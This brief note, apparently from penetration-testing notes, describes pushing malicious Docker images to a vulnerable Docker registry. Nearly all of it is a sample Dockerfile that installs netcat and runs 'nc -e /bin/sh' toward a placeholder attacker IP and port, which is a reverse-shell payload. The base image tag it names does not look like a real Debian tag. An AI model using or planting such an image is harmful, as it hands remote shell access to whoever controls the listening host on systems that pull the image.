### Essentially, we can upload/publish/push docker images with malicious code (reverse shell) to a vulnerable docker registry

### Example:

#### FROM debian:jimmy-kekw

#### RUN apt-get update -y

#### RUN apt-get install netcat -y

#### RUN nc -e /bin/sh ATTACK_IP PORT
